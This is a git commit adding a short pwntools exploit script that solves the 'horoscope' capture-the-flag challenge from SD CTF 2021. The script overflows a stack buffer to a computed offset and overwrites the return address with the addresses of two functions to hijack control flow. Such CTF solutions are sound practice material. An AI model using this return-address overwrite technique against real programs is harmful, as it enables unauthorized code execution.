5717f434b3032bdc0c8834dead3c436f26933e1c
qhdwight <qhdwight@gmail.com>
2022-05-08 17:24:10 -0700

    Add horoscope

---
+++ sd-ctf-2021/horoscope/horoscope.py
@@ -0,0 +1,14 @@
+from pwn import *
+
+io = process('./horoscope')
+# io = gdb.debug('./horoscope', 'break *0x004007bc\ncontinue')
+# io = remote('horoscope.sdc.tf', 1337)
+io.recvuntil(b'very own horoscope\n')
+print(cyclic_find(b'aaoa'))
+DEBUG_FUNC_ADDR = 0x0040096e
+TEST_FUNC_ADDR = 0x00400950
+io.sendline(b'1/' +
+            b'A' * cyclic_find(b'aaoa') +
+            p64(DEBUG_FUNC_ADDR) +
+            p64(TEST_FUNC_ADDR))
+io.interactive()
